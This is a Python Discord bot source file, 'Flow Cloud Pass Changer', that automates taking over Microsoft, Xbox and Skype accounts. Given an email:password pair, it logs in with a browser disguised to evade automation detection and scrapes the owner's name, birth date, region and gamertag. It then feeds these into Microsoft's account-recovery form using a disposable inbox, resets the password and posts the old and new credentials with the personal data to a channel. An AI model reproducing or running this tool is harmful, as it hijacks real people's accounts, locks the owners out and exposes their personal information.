import discord
from discord.ext import commands
import json
import os
import asyncio
import random
import string
import time
import re
import requests
import socket
from io import BytesIO
from datetime import datetime
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import platform
import pycountry

OWNER_ID = 1383641747913183256
CONFIG_FILE = "config.json"
AUTH_DB_FILE = "authdb.json"
SETTINGS_FILE = "settings.json"

all_countries = {country.name for country in pycountry.countries}

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def load_auth_db():
    try:
        with open(AUTH_DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"authorized_users": []}

def save_auth_db(data):
    with open(AUTH_DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_settings():
    try:
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"log_channel": None, "captcha_channel": None, "success_channel": None}

def save_settings(data):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_authorized(user_id):
    auth_db = load_auth_db()
    return user_id in auth_db.get("authorized_users", []) or user_id == OWNER_ID

def generate_password(prefix="FlowCloud", length=6):
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(length)])
    return f"{prefix}{random_numbers}"

BASE_URL = "https://api.mail.tm"

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_domains():
    r = requests.get(f"{BASE_URL}/domains")
    return r.json()['hydra:member'][0]['domain']

def register_account(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/accounts", json=payload)
    return r.status_code in [201, 422]

def get_token(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/token", json=payload)
    return r.json()['token']

def get_messages(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages", headers=headers)
    return r.json().get('hydra:member', [])

def read_message(token, message_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages/{message_id}", headers=headers)
    return r.json()

def generate_temp_mail_account():
    username = random_name()
    password = random_name(12)
    domain = get_domains()
    email = f"{username}@{domain}"
    register_account(email, password)
    token = get_token(email, password)
    return email, password, token

def wait_for_emails(token, expected_count=2, timeout=90, interval=5):
    attempts = timeout // interval
    for _ in range(attempts):
        inbox = get_messages(token)
        if len(inbox) >= expected_count:
            return inbox[:expected_count]
        time.sleep(interval)
    return get_messages(token)

def extract_otp(text):
    match = re.search(r'\b\d{6}\b', text)
    return match.group(0) if match else None

def get_otp_from_first_email(token):
    emails = wait_for_emails(token, expected_count=1)
    if not emails:
        return None
    msg = read_message(token, emails[0]['id'])
    return extract_otp(msg['text'])

def extract_specific_link(text):
    lines = text.splitlines()
    for i, line in enumerate(lines):
        if "Click this link to reset your password:" in line:
            for j in range(i + 1, len(lines)):
                next_line = lines[j].strip()
                if next_line.startswith("http"):
                    return next_line
    return None

def create_driver(headless=True):
    options = Options()
    if headless:
        options.add_argument("--headless=new")
    else:
        options.add_argument("--start-minimized")
    
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--incognito")
    options.add_argument("--disable-webauthn")
    options.add_argument("--disable-features=WebAuthentication,WebAuthn")
    
    system = platform.system().lower()
    if system == 'linux':
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    
    options.add_argument(f"user-agent={user_agent}")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    chrome_paths = [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/opt/google/chrome/chrome",
        "/snap/bin/chromium",
        "/nix/store/chromium"
    ]
    
    for chrome_path in chrome_paths:
        if os.path.exists(chrome_path):
            options.binary_location = chrome_path
            break

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
    except Exception as e:
        try:
            driver = webdriver.Chrome(options=options)
        except Exception as e2:
            raise e2
    
    try:
        driver.execute_cdp_cmd(
            'Page.addScriptToEvaluateOnNewDocument',
            {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.navigator.chrome = { runtime: {} };
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            }
        )
    except:
        pass
    
    return driver

def download_captcha(driver):
    try:
        captcha_img = driver.find_element(By.XPATH, '//img[contains(@src, "GetHIPData")]')
        src = captcha_img.get_attribute("src")
        response = requests.get(src)
        img = Image.open(BytesIO(response.content))
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def scrape_account_info(email, password):
    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    try:
        driver.get("https://login.live.com")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)

        password_input = None

        try:
            password_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
        except TimeoutException:
            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                try:
                    other_ways_btn = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]"))
                    )
                    other_ways_btn.click()
                    time.sleep(1)
                    use_password_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                    )
                    use_password_btn.click()
                    password_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )
                except TimeoutException:
                    try:
                        switch_link = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.ID, "idA_PWD_SwitchToCredPicker"))
                        )
                        switch_link.click()
                        time.sleep(1)
                        use_password_btn = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                        )
                        use_password_btn.click()
                        password_input = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.NAME, "passwd"))
                        )
                    except TimeoutException:
                        return {"email": email, "error": "Could not reach password input"}

        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)

        try:
            password_input = driver.find_element(By.ID, "passwordEntry")
            if password_input.is_displayed():
                return {"email": email, "error": "Incorrect password"}
        except:
            pass

        try:
            if "Too Many Requests" in driver.page_source:
                retries = 0
                max_retries = 20
                while "Too Many Requests" in driver.page_source and retries < max_retries:
                    time.sleep(1)
                    driver.refresh()
                    retries += 1
                if "Too Many Requests" in driver.page_source:
                    return {"email": email, "error": "Too Many Requests even after retry"}
        except:
            pass

        try:
            security_next_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "iLandingViewAction"))
            )
            security_next_btn.click()
            time.sleep(2)
        except:
            pass

        try:
            stay_signed_in_yes = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
            )
            stay_signed_in_yes.click()
            time.sleep(2)
        except:
            return {"email": email, "error": "Incorrect password"}

        try:
            close_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Close"]'))
            )
            close_button.click()
            time.sleep(1)
        except:
            pass

        driver.get("https://account.microsoft.com/profile")
        time.sleep(2)
        driver.get("https://account.microsoft.com/profile")
        
        try:
            wait.until(EC.presence_of_element_located((By.ID, "profile.profile-page.personal-section.full-name")))
            name = driver.find_element(By.ID, "profile.profile-page.personal-section.full-name").text.strip()
            spans = driver.find_elements(By.CSS_SELECTOR, 'span.fui-Text')
            dob = "DOB not found"
            region = "Region not found"

            for span in spans:
                text = span.text.strip()
                if "/" in text and len(text.split("/")) == 3:
                    parts = text.split(";")
                    for part in parts:
                        part = part.strip()
                        if "/" in part and len(part.split("/")) == 3:
                            dob = part
                            break
                elif text in all_countries:
                    region = text
        except:
            return {"email": email, "error": "Couldn't get account info, Make sure account is not blocked"}

        driver.get("https://secure.skype.com/portal/profile")
        time.sleep(3)

        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
        except:
            skype_id = "live:"

        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
        except:
            skype_email = email

        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)

        gamertag = "Not found"

        try:
            try:
                sign_in_btn = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
                sign_in_btn.click()
                time.sleep(7)
            except:
                pass

            try:
                account_btn = WebDriverWait(driver, 6).until(
                    EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
                )
                account_btn.click()
                WebDriverWait(driver, 15).until(EC.url_contains("/play/user/"))
            except:
                pass

            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1]
                gamertag = gamertag.replace("%20", " ").replace("%25", "%")
        except:
            gamertag = "Error"

        return {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag
        }

    except:
        return {"error": "Could Not Login!"}
    finally:
        driver.quit()

def submit_acsr_form(account_info):
    email = account_info['email']
    tempmail, temp_pass, token = generate_temp_mail_account()
    driver = create_driver()
    wait = WebDriverWait(driver, 20)
    
    try:
        driver.get("https://account.live.com/acsr")
        time.sleep(2)
        
        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        
        tempmail_input = wait.until(EC.presence_of_element_located((By.ID, "iCMailInput")))
        tempmail_input.clear()
        tempmail_input.send_keys(tempmail)
        
        captcha_image = download_captcha(driver)
        
        return captcha_image, driver, token, tempmail
        
    except Exception as e:
        driver.quit()
        return None, None, None, None

def get_month_name(date_str):
    try:
        date_obj = datetime.strptime(date_str, "%m/%d/%Y")
        month_name = date_obj.strftime("%B")
        day = str(date_obj.day)
        year = str(date_obj.year)
        return month_name, day, year
    except ValueError:
        return "May", "5", "1989"

def continue_acsr_flow(driver, account_info, token, captcha_text, user_id):
    wait = WebDriverWait(driver, 20)

    try:
        captcha_value = captcha_text

        try:
            captcha_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, '//input[contains(@id, "SolutionElement")]'))
            )
            captcha_input.clear()
            captcha_input.send_keys(captcha_value)
            captcha_input.send_keys(Keys.RETURN)

            code_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "iOttText"))
            )

        except Exception:
            try:
                captcha_image = download_captcha(driver)
                if captcha_image:
                    with open(f"captcha_retry_{user_id}.png", "wb") as f:
                        f.write(captcha_image.read())
                return "CAPTCHA_RETRY_NEEDED"
            except:
                return "CAPTCHA_DOWNLOAD_FAILED"

        otp = get_otp_from_first_email(token)
        if not otp:
            return "OTP not received."

        code_input = wait.until(EC.presence_of_element_located((By.ID, "iOttText")))
        code_input.clear()
        code_input.send_keys(otp)
        code_input.send_keys(Keys.RETURN)
        time.sleep(2)

        first, last = account_info['name'].split(maxsplit=1) if ' ' in account_info['name'] else (account_info['name'], "Last")
        wait.until(EC.presence_of_element_located((By.ID, "FirstNameInput"))).send_keys(first)
        wait.until(EC.presence_of_element_located((By.ID, "LastNameInput"))).send_keys(last)

        month, day, year = get_month_name(account_info['dob'])

        if not all([month, day, year]):
            raise ValueError("Invalid or missing DOB")

        day_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
        )
        Select(day_element).select_by_visible_text(day)

        month_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
        )
        Select(month_element).select_by_visible_text(month)

        year_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_yearInput"))
        )
        Select(year_element).select_by_visible_text(year)

        wait.until(EC.presence_of_element_located((By.ID, "CountryInput"))).send_keys(account_info['region'])
        time.sleep(1)

        first_name_input = driver.find_element(By.ID, "FirstNameInput")
        first_name_input.send_keys(Keys.RETURN)
        time.sleep(1)

        previous_pass_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]'))
        )
        previous_pass_input.clear()
        previous_pass_input.send_keys(account_info["password"])
        time.sleep(2)

        skype_checkbox = driver.find_element(By.ID, "ProductOptionSkype")
        if not skype_checkbox.is_selected():
            skype_checkbox.click()

        xbox_checkbox = driver.find_element(By.ID, "ProductOptionXbox")
        if not xbox_checkbox.is_selected():
            xbox_checkbox.click()

        previous_pass_input.send_keys(Keys.RETURN)
        skype_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeNameInput"))
        )
        skype_name_input.clear()
        skype_name_input.send_keys(account_info["skype_id"])

        skype_email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeAccountCreateEmailInput"))
        )
        skype_email_input.clear()
        skype_email_input.send_keys(account_info["skype_email"])
        time.sleep(2)
        skype_email_input.send_keys(Keys.RETURN)

        xbox_radio = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "XboxOneOption"))
        )
        if not xbox_radio.is_selected():
            xbox_radio.click()
        xbox_radio.send_keys(Keys.ENTER)
        time.sleep(2)

        xbox_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "XboxGamertagInput"))
        )
        xbox_name_input.clear()
        xbox_name_input.send_keys(account_info["gamertag"])
        xbox_name_input.send_keys(Keys.RETURN)

        try:
            time.sleep(90)
            emails = wait_for_emails(token, expected_count=2)
            email2 = read_message(token, emails[0]['id'])
            resetlink = extract_specific_link(email2['text'])

            try:
                driver.quit()
            except:
                pass

            if resetlink:
                return resetlink
            else:
                return None
        except Exception as e:
            return None

    except Exception as e:
        return None

def perform_password_reset(resetlink, email, new_password):
    driver = create_driver()
    wait = WebDriverWait(driver, 25)
    try:
        driver.get(resetlink)

        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)

        new_pass = wait.until(EC.presence_of_element_located((By.ID, "iPassword")))
        new_pass.clear()
        new_pass.send_keys(new_password)

        new_pass_re = wait.until(EC.presence_of_element_located((By.ID, "iRetypePassword")))
        new_pass_re.clear()
        new_pass_re.send_keys(new_password)
        time.sleep(1)
        new_pass_re.send_keys(Keys.RETURN)

        time.sleep(5)

        try:
            driver.find_element(By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]')
            fallback_pass = "SladePass!12"

            pass_input = driver.find_element(By.ID, "iPassword")
            pass_input.clear()
            pass_input.send_keys(fallback_pass)

            retype_input = driver.find_element(By.ID, "iRetypePassword")
            retype_input.clear()
            retype_input.send_keys(fallback_pass)
            retype_input.send_keys(Keys.RETURN)

            return fallback_pass
        except:
            return new_password

    except Exception as e:
        return None
    finally:
        driver.quit()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='+', intents=intents)

pending_passchange = {}
pending_captcha = {}

def make_embed(title, description, color=discord.Color.teal()):
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_footer(text="Flow Cloud Pass Changer")
    return embed

def log_to_channel(guild, log_type, message):
    settings = load_settings()
    log_channel_id = settings.get("log_channel")
    if log_channel_id:
        log_channel = guild.get_channel(log_channel_id)
        if log_channel:
            embed = make_embed("Log Entry", f"**{log_type}**\n{message}")
            asyncio.create_task(log_channel.send(embed=embed))

@bot.event
async def on_ready():
    print(f'Bot is ready! Logged in as {bot.user}')

@bot.command(name='connect')
async def connect(ctx, target: str):
    try:
        if "://" in target:
            protocol, rest = target.split("://", 1)
        else:
            rest = target
            protocol = "tcp"

        if ":" in rest:
            ip, port = rest.rsplit(":", 1)
            port = int(port)
        else:
            ip = rest
            port = 80

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((ip, port))
        sock.close()

        if result == 0:
            embed = make_embed("Connected", f"Successfully connected to {target}", discord.Color.green())
        else:
            embed = make_embed("Connection Failed", f"Could not connect to {target}", discord.Color.red())
        await ctx.send(embed=embed)
    except Exception as e:
        embed = make_embed("Error", f"Invalid target format: {e}", discord.Color.red())
        await ctx.send(embed=embed)

@bot.command(name='auth')
async def auth_user(ctx, member: discord.Member):
    if ctx.author.id != OWNER_ID:
        embed = make_embed("Access Denied", "Only the owner can authorize users.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    auth_db = load_auth_db()
    if member.id not in auth_db["authorized_users"]:
        auth_db["authorized_users"].append(member.id)
        save_auth_db(auth_db)
        embed = make_embed("User Authorized", f"{member.mention} has been authorized to use passchange.", discord.Color.green())
    else:
        embed = make_embed("Already Authorized", f"{member.mention} is already authorized.", discord.Color.orange())
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Authorization", f"{ctx.author} authorized {member}")

@bot.command(name='unauth')
async def unauth_user(ctx, member: discord.Member):
    if ctx.author.id != OWNER_ID:
        embed = make_embed("Access Denied", "Only the owner can unauthorize users.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    auth_db = load_auth_db()
    if member.id in auth_db["authorized_users"]:
        auth_db["authorized_users"].remove(member.id)
        save_auth_db(auth_db)
        embed = make_embed("User Unauthorized", f"{member.mention} has been removed from authorized users.", discord.Color.green())
    else:
        embed = make_embed("Not Authorized", f"{member.mention} was not in the authorized list.", discord.Color.orange())
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Unauthorization", f"{ctx.author} unauthorized {member}")

@bot.command(name='setlog')
async def set_log(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        embed = make_embed("Access Denied", "Only the owner can set log channel.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    settings = load_settings()
    settings["log_channel"] = channel.id
    save_settings(settings)
    embed = make_embed("Log Channel Set", f"Log channel set to {channel.mention}", discord.Color.green())
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Settings", f"{ctx.author} set log channel to {channel.mention}")

@bot.command(name='setcaptcha')
async def set_captcha(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        embed = make_embed("Access Denied", "Only the owner can set captcha channel.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    settings = load_settings()
    settings["captcha_channel"] = channel.id
    save_settings(settings)
    embed = make_embed("Captcha Channel Set", f"Captcha channel set to {channel.mention}", discord.Color.green())
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Settings", f"{ctx.author} set captcha channel to {channel.mention}")

@bot.command(name='setsuccess')
async def set_success(ctx, channel: discord.TextChannel):
    if ctx.author.id != OWNER_ID:
        embed = make_embed("Access Denied", "Only the owner can set success channel.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    settings = load_settings()
    settings["success_channel"] = channel.id
    save_settings(settings)
    embed = make_embed("Success Channel Set", f"Success channel set to {channel.mention}", discord.Color.green())
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Settings", f"{ctx.author} set success channel to {channel.mention}")

@bot.command(name='passchange')
async def passchange(ctx, credentials: str):
    if not is_authorized(ctx.author.id):
        embed = make_embed("Access Denied", "You are not authorized to use this command. Contact the owner to get authorized.", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if ':' not in credentials:
        embed = make_embed("Invalid Format", "Use format: `+passchange email:password`", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    email, password = credentials.split(':', 1)
    email = email.strip()
    password = password.strip()
    
    new_password = generate_password()
    
    pending_passchange[ctx.author.id] = {
        "email": email,
        "password": password,
        "new_password": new_password,
        "channel_id": ctx.channel.id
    }
    
    embed = make_embed(
        "Password Change",
        f"Auto-generated password: `{new_password}`\n\nReply with:\n- `use` to use this password\n- Type your custom password to override"
    )
    await ctx.send(embed=embed)
    log_to_channel(ctx.guild, "Command", f"{ctx.author} started passchange for {email}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    await bot.process_commands(message)
    
    settings = load_settings()
    captcha_channel_id = settings.get("captcha_channel")
    
    if message.author.id in pending_passchange and message.channel.id == pending_passchange[message.author.id]["channel_id"]:
        data = pending_passchange[message.author.id]
        content = message.content.strip()
        
        if content.lower() == 'use':
            new_password = data['new_password']
        else:
            new_password = content
        
        del pending_passchange[message.author.id]
        
        embed = make_embed(
            "Processing Password Change",
            f"Starting password change for `{data['email']}`\nNew password will be: `{new_password}`\n\nPlease wait..."
        )
        status_msg = await message.channel.send(embed=embed)
        
        await process_password_change(message.channel, message.author, data['email'], data['password'], new_password, status_msg)
    
    if message.author.id in pending_captcha:
        captcha_data = pending_captcha[message.author.id]
        expected_channel = captcha_data.get("captcha_channel_id")
        
        if expected_channel and message.channel.id != expected_channel:
            return
        
        if not expected_channel and message.channel.id != captcha_data["original_channel_id"]:
            return
        
        captcha_text = message.content.strip()
        del pending_captcha[message.author.id]
        
        await continue_captcha_flow(message.channel, message.author, captcha_text, captcha_data)

async def process_password_change(channel, user, email, old_password, new_password, status_msg):
    settings = load_settings()
    log_channel_id = settings.get("log_channel")
    captcha_channel_id = settings.get("captcha_channel")
    success_channel_id = settings.get("success_channel")
    
    try:
        embed = make_embed("Step 1/5", "Scraping account information...")
        await status_msg.edit(embed=embed)
        
        account_info = await asyncio.to_thread(scrape_account_info, email, old_password)
        
        if account_info.get("error"):
            embed = make_embed("Error", f"Failed to scrape account: {account_info['error']}", discord.Color.red())
            await status_msg.edit(embed=embed)
            return
        
        embed = make_embed("Step 2/5", "Submitting ACSR form...")
        await status_msg.edit(embed=embed)
        
        captcha_img, driver, token, tempmail = await asyncio.to_thread(submit_acsr_form, account_info)
        
        if not captcha_img:
            embed = make_embed("Error", "Failed at ACSR step", discord.Color.red())
            await status_msg.edit(embed=embed)
            return
        
        pending_captcha[user.id] = {
            "driver": driver,
            "account_info": account_info,
            "token": token,
            "new_password": new_password,
            "status_msg": status_msg,
            "channel": channel,
            "captcha_channel_id": captcha_channel_id,
            "original_channel_id": channel.id
        }
        
        captcha_img.seek(0)
        file = discord.File(captcha_img, filename="captcha.png")
        
        if captcha_channel_id:
            captcha_channel = bot.get_channel(captcha_channel_id)
            if captcha_channel:
                embed = make_embed(
                    "CAPTCHA Required",
                    f"{user.mention} - Please solve this CAPTCHA and type your answer in this channel."
                )
                embed.set_image(url="attachment://captcha.png")
                await captcha_channel.send(embed=embed, file=file)
                
                info_embed = make_embed(
                    "Step 3/5",
                    f"CAPTCHA sent to {captcha_channel.mention}. Please solve it there."
                )
                await status_msg.edit(embed=info_embed)
            else:
                embed = make_embed("CAPTCHA Required", "Solve the CAPTCHA and reply with the text.")
                embed.set_image(url="attachment://captcha.png")
                await channel.send(embed=embed, file=file)
        else:
            embed = make_embed("CAPTCHA Required", "Solve the CAPTCHA and reply with the text.")
            embed.set_image(url="attachment://captcha.png")
            await channel.send(embed=embed, file=file)
            
    except Exception as e:
        embed = make_embed("Error", f"An error occurred: {str(e)}", discord.Color.red())
        await status_msg.edit(embed=embed)

async def continue_captcha_flow(channel, user, captcha_text, captcha_data):
    driver = captcha_data["driver"]
    account_info = captcha_data["account_info"]
    token = captcha_data["token"]
    new_password = captcha_data["new_password"]
    status_msg = captcha_data["status_msg"]
    original_channel = captcha_data["channel"]
    
    settings = load_settings()
    success_channel_id = settings.get("success_channel")
    log_channel_id = settings.get("log_channel")
    
    try:
        embed = make_embed("Step 4/5", "Processing CAPTCHA and completing ACSR flow...\nThis may take 2-3 minutes.")
        await status_msg.edit(embed=embed)
        
        correct_embed = make_embed("Correct CAPTCHA", "Processing your CAPTCHA solution...")
        await channel.send(embed=correct_embed)
        
        reset_link = await asyncio.to_thread(continue_acsr_flow, driver, account_info, token, captcha_text, str(user.id))
        
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            wrong_embed = make_embed("Wrong CAPTCHA", "The CAPTCHA was incorrect. Please try again with `+passchange`", discord.Color.red())
            await channel.send(embed=wrong_embed)
            await status_msg.edit(embed=wrong_embed)
            return
        
        if not reset_link or reset_link in ["OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
            embed = make_embed("Error", f"Failed to get reset link: {reset_link}", discord.Color.red())
            await status_msg.edit(embed=embed)
            return
        
        embed = make_embed("Step 5/5", "Resetting password...")
        await status_msg.edit(embed=embed)
        
        updated_password = await asyncio.to_thread(perform_password_reset, reset_link, account_info['email'], new_password)
        
        if not updated_password:
            embed = make_embed("Error", "Failed to reset password", discord.Color.red())
            await status_msg.edit(embed=embed)
            return
        
        success_embed = make_embed("Flow Cloud Pass Changer", "")
        success_embed.add_field(name="Email", value=account_info.get('email', 'N/A'), inline=False)
        success_embed.add_field(name="Old Password", value=account_info.get('password', 'N/A'), inline=False)
        success_embed.add_field(name="New Password", value=updated_password, inline=False)
        success_embed.add_field(name="Skype Email", value=account_info.get('skype_email', 'N/A'), inline=False)
        success_embed.add_field(name="Skype ID", value=account_info.get('skype_id', 'N/A'), inline=False)
        success_embed.add_field(name="DOB", value=account_info.get('dob', 'N/A'), inline=False)
        success_embed.add_field(name="Region", value=account_info.get('region', 'N/A'), inline=False)
        success_embed.add_field(name="Name", value=account_info.get('name', 'N/A'), inline=False)
        success_embed.add_field(name="Gamer Tag", value=account_info.get('gamertag', 'N/A'), inline=False)
        
        await status_msg.edit(embed=success_embed)
        
        if success_channel_id:
            success_channel = bot.get_channel(success_channel_id)
            if success_channel:
                await success_channel.send(embed=success_embed)
        
        if log_channel_id:
            log_channel = bot.get_channel(log_channel_id)
            if log_channel:
                log_embed = make_embed("Password Change Log", f"Password changed for {account_info.get('email', 'N/A')}")
                await log_channel.send(embed=log_embed)
        
    except Exception as e:
        embed = make_embed("Error", f"An error occurred: {str(e)}", discord.Color.red())
        await status_msg.edit(embed=embed)
    finally:
        try:
            if driver:
                driver.quit()
        except:
            pass

if __name__ == "__main__":
    config = load_config()
    token = config.get("token") or config.get("bot_token") or os.environ.get("DISCORD_TOKEN")
    
    if not token:
        print("Error: No Discord token found in config.json or environment variables")
        print("Please add 'token' to config.json or set DISCORD_TOKEN environment variable")
        exit(1)
    
    bot.run(token)
